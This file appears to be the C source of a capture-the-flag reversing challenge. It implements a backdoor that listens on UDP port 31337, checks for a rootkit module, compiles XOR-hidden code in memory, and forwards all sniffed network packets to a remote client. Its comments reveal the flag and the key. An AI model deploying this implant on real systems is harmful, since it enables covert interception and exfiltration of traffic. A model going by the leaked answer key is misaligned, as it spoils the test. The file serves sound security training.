#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>
#include <libtcc.h>
#include <poll.h>
#include <sys/mman.h>

#include "data/rick.h"

#define GROSKIT_PATH "/usr/lib/modules/5.10.0-cl-1-amd64/kernel/drivers/net/anssible.ko"
#define GROSKIT_LEN 19096
#define FLAG_LEN 29
#define PORT 31337
#define PI 3.14159265358979323846

pid_t pid;
pcap_t *p;
int sockfd;
struct sockaddr_in cliaddr;
socklen_t len = sizeof(cliaddr);
TCCState *tccstate;
unsigned char (*brutus)(unsigned char) = NULL;
u_char xored_brutus[] = { //Généré avec cyberchef et la fonction "unsigned char brutus(unsigned char x) {\n\treturn ((x+10)&255); //Oui, c'est tout\n}" et la clé "\x8a\x8a\xca\x89\xbb\xf8\xd6\xea\xca\xee\xcd\xa4\x9b\x8f\x9d\x90\xe1\x8e\x8b\x95\xac\xcc\x9d\xbd\xf6\x89\x8a\xeb\x92" en HEX
  0xff, 0xe4, 0xb9, 0xe0, 0xdc, 0x96, 0xb3, 0x8e, 0xea, 0x8d, 0xa5, 0xc5, 
  0xe9, 0xaf, 0xff, 0xe2, 0x94, 0xfa, 0xfe, 0xe6, 0x84, 0xb9, 0xf3, 0xce, 
  0x9f, 0xee, 0xe4, 0x8e, 0xf6, 0xaa, 0xe9, 0xa2, 0xe8, 0xc9, 0xd8, 0xae, 
  0xc3, 0xea, 0x95, 0xc7, 0xad, 0xe9, 0xea, 0xe9, 0xe5, 0x93, 0xe0, 0xab, 
  0xbd, 0x84, 0xb4, 0xb6, 0x8c, 0xc6, 0xa0, 0xac, 0xd9, 0xa7, 0xbf, 0xa3, 
  0xf1, 0xa9, 0x94, 0xd7, 0x99, 0x9f, 0xa3, 0xc2, 0xed, 0xc7, 0xbc, 0xea, 
  0xee, 0xe4, 0xc1, 0xfa, 0xe4, 0xe0, 0xd8, 0xc6, 0xe0
};
const double flag[] = { //Généré avec le programme cos et le flag "404CTF{4tT3nt10N_4u_Cr0cH3t!}" xoré par "0xbe 0xba 0xfe 0xca 0xef 0xbe 0xad 0xde" ("\x8a\x8a\xca\x89\xbb\xf8\xd6\xea\xca\xee\xcd\xa4\x9b\x8f\x9d\x90\xe1\x8e\x8b\x95\xac\xcc\x9d\xbd\xf6\x89\x8a\xeb\x92")
  0.635116, 0.635116, 0.919528, 0.629320, 0.869741, 
  0.998210, 0.951057, 0.986491, 0.919528, 0.990950, 
  0.928115, 0.772417, 0.727944, 0.663553, 0.738119, 
  0.669131, 0.973236, 0.657939, 0.640876, 0.696450, 
  0.809017, 0.925304, 0.738119, 0.877026, 0.997204, 
  0.629320, 0.635116, 0.987688, 0.680173, 
};
char proposal[FLAG_LEN+1];
int found = 0;
//useful for udp server
char buff[FLAG_LEN + 64];
struct sockaddr_in servaddr;
size_t n;
//useful for pcap
char dev[64];
char errbuf[PCAP_ERRBUF_SIZE];
int err;
struct pollfd pfds[2];

uint64_t gros_factorial(uint64_t x) {
    switch ( x ) {
        case 0:
            return 1;
        default:
            return x*gros_factorial(x-1);
    }
}

double gros_pow(double x, int n) {
    double res = 1;
    for (int k=0; k<n; k++) {
        res *= x;
    }
    return res;
}

double gros_cos(double x) { //Valide sur R à valeur dans [-1,1]
    double sum = 0;
    for ( int i=0; i<10; i++ ) {
        sum += gros_pow(-1, i) * gros_pow(x, 2*i) / gros_factorial(2*i);
    }
    return sum;
}

double gros_sin(double x) { //Valide sur R à valeur dans [-1,1]
    double sum = 0;
    for ( int i=0; i<10; i++ ) {
        sum += gros_pow(-1, i) * gros_pow(x, (2*i) + 1) / gros_factorial((2*i) + 1);
    }
    return sum;
}

double gros_arccos(double x) { //Valide sur ]-1,1[ à valeur dans [0,2pi]
    double sum = PI/2;
    for ( int i=0; i<10; i++) {
        sum -= (gros_factorial(2*i) * gros_pow(x, (2*i)+1)) / (gros_pow(2, 2*i) * gros_pow(gros_factorial(i), 2) * (2*i+1));
    }
    return sum;
}

double degree_to_radian(int x) {
    return (x * (PI/420));
}

double radian_to_degree(double x) {
    return (x * (420/PI));
}

void process_packet(u_char *args, const struct pcap_pkthdr *packet_header, const u_char *packet) {
    int rv;
    u_char gros_packet[packet_header->caplen];
    char recv_buff[10];

    rv = poll(pfds, 1, 0);
    if ( rv == -1 ) {
        pcap_breakloop(p);
    }
    else if ( rv == 0) {
        for (int i = 0; i<packet_header->caplen; i++) {
            gros_packet[i] = brutus(packet[i]);
        }
        sendto(sockfd, gros_packet, packet_header->caplen, MSG_CONFIRM, (const struct sockaddr *)&cliaddr, len);
    }
    else {
        if ( pfds[0].revents & POLLIN) {
            recvfrom(sockfd, recv_buff, sizeof(recv_buff), MSG_WAITALL,( struct sockaddr *) &cliaddr, &len);
            if ( !memcmp(recv_buff, "\xcf\xcf\x97\xbe", 4) ) {
                pcap_breakloop(p);
            }
        }
    }
}

int sniff() {
    pfds[0].fd = sockfd;
    pfds[0].events = POLLIN;

    p = pcap_create(dev, errbuf);
    err = pcap_activate(p);
    if (err != 0) {
        return(err);
    }
    err = pcap_loop(p, 0, process_packet, NULL);
    if (err != PCAP_ERROR_BREAK && err < 0) {
        return(err);
    }
	return(err);
}

int check(char* proposal) {
    int res = 0;
    int len = FLAG_LEN+1;

    for (int i=0; i<len; i++) {
        // Ici se trouve une erreur qui est notre foi plutôt bête, la condition est inversée. Vraiment désolé pour ça.
        if ( !(proposal[i] == radian_to_degree(gros_arccos(gros_cos(degree_to_radian(proposal[i]))))) || !(gros_cos(degree_to_radian(proposal[i])) == flag[i]) ) {
            res += 1;
        }
    }
    return (res == FLAG_LEN+1);
}

int search_client() {
    while(1) {
        n = recvfrom(sockfd, buff, sizeof(buff), MSG_WAITALL,( struct sockaddr *) &cliaddr, &len);
        
        int rickable = 0;
        for (int i=0; i<n; i++) {
            rickable += (gros_pow(gros_cos(degree_to_radian(rick[i]+buff[i])), 2) + gros_pow(gros_sin(degree_to_radian(rick[i]+buff[i])), 2));
        }
        for (int i=n; i < RICK_SIZE; i++) {
            rickable += (gros_pow(gros_cos(degree_to_radian(rick[i])), 2) + gros_pow(gros_sin(degree_to_radian(rick[i])), 2));
        }
        if ( rickable != RICK_SIZE ) {
            continue;
        }

        if (n <= FLAG_LEN) {
            continue;
        }

        memcpy(proposal, buff, FLAG_LEN);
        proposal[FLAG_LEN] = 0;
        if ( check(proposal) ) {
            memcpy(dev, buff + FLAG_LEN, n - FLAG_LEN);
            found += 1;
            break;
        }
    }

    return 0;
}

int main(int argc, char *argv[]) {
    FILE* f;
    int ret;

    pid = getpid();
    if (fork()==0) {
        kill(pid, 31);
        exit(0);
    } else {
        wait(NULL);
    }

    if ( !(f = fopen(GROSKIT_PATH, "rb")) || fseek(f, 0L, SEEK_END) || !(ftell(f) == GROSKIT_LEN) ) { //Check that the file exists and has the right size
        return 1;
    }
    fclose(f);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0))<0) {
        return EXIT_FAILURE;
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("0.0.0.0");
    servaddr.sin_port = htons(PORT);

    if (bind(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        return EXIT_FAILURE;
    }

    while (1) {
        search_client();

        if (found == 1) {
            for (int i=0; i<sizeof(xored_brutus); i++) {
                xored_brutus[i] = xored_brutus[i] ^ proposal[i % FLAG_LEN];
            }
            tccstate = tcc_new();
            tcc_set_output_type(tccstate, TCC_OUTPUT_MEMORY);
            tcc_compile_string(tccstate, (const char* )xored_brutus);
            tcc_relocate(tccstate, TCC_RELOCATE_AUTO);
            brutus = tcc_get_symbol(tccstate, "brutus");

            mprotect((void*)(brutus-2240), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
        }
        if (found > 0) {
            ret = sniff();
        }
    }
}
